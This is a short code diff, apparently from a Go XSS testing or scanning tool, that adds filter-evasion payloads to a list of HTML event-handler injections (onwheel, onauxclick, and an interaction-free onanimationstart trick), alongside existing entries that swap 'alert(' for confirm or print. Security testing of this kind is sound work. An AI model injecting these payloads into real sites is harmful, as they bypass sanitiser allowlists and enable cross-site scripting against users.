@@ -90,6 +90,15 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<style onload=` + xssAlert + `></style>`, "style", "onload"},
 		{`<svg><set attributeName=x onbegin=` + xssAlert + `>`, "set", "onbegin"},
 		{`<form><button formaction=javascript:` + xssAlert + `>x`, "button", "formaction"},
+		// onwheel/onauxclick are pointer-input events absent from most handler
+		// allowlists built around the common onclick/onerror/onload/onfocus set.
+		{`<div onwheel=` + xssAlert + `>x</div>`, "div", "onwheel"},
+		{`<div onauxclick=` + xssAlert + `>x</div>`, "div", "onauxclick"},
+		// onanimationstart fires as soon as a CSS animation starts; an inline
+		// style that both defines and immediately applies a trivial keyframe
+		// animation makes it fire with no interaction, like ontoggle/onbegin
+		// above but via the CSS Animations event family instead of SVG SMIL.
+		{`<div style="animation-name:x" onanimationstart=` + xssAlert + `><style>@keyframes x{}</style></div>`, "div", "onanimationstart"},
 		// ── JS-call obfuscation (filter targets the literal "alert(") ──
 		{`<svg onload=confirm(document.domain)>`, "svg", "confirm("},
 		{`<svg onload=print()>`, "svg", "print("},
